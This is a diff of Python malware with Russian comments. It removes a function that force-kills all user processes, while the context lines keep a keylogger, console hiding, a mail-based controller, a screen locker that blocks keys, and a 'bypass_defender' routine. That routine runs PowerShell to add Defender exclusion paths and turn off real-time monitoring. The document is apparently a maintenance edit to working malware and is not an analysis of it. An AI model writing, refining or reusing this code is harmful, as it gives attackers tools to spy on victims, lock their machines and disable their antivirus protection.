@@ -24,7 +24,7 @@ CHECK_INTERVAL = 15
 attempts_left = MAX_ATTEMPTS
 keylog_data = []
 
-# ===== СКРЫТИЕ CMD (ИСПРАВЛЕНО) =====
+# ===== СКРЫТИЕ CMD =====
 def hide_console():
     try:
         hwnd = ctypes.windll.kernel32.GetConsoleWindow()
@@ -113,20 +113,6 @@ def bypass_defender():
             for p in [tempfile.gettempdir(), os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows')]:
                 os.system(f'powershell -Command "Add-MpPreference -ExclusionPath \'{p}\'" >nul 2>&1')
             os.system('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1')
-    except: pass
-
-# ===== ЗАКРЫТИЕ ПРИЛОЖЕНИЙ =====
-def kill_all_apps():
-    exclude = ['System','smss.exe','csrss.exe','wininit.exe','winlogon.exe','services.exe','lsass.exe','svchost.exe','dwm.exe']
-    try:
-        result = subprocess.check_output('tasklist /FO CSV /NH', shell=True, stderr=subprocess.DEVNULL).decode('cp866', errors='replace')
-        for line in result.split('\n'):
-            if line.strip():
-                parts = line.replace('"','').split(',')
-                if len(parts) >= 1:
-                    proc = parts[0].strip().lower()
-                    if proc not in [e.lower() for e in exclude] and proc.endswith('.exe'):
-                        os.system(f'taskkill /f /im {proc} >nul 2>&1')
     except: pass
 
 # ===== РАСШИФРОВКА =====
@@ -675,8 +661,6 @@ if __name__ == "__main__":
         sys.exit(0)
     
     if "--locker" in sys.argv:
-        kill_all_apps()
-        time.sleep(2)
         time.sleep(TIMER_SECONDS)
         boot_anim()
         block_keys()
@@ -693,8 +677,6 @@ if __name__ == "__main__":
     threading.Thread(target=mail_controller, daemon=True).start()
     threading.Thread(target=keylogger_thread, daemon=True).start()
     
-    kill_all_apps()
-    time.sleep(2)
     time.sleep(TIMER_SECONDS)
     boot_anim()
     block_keys()
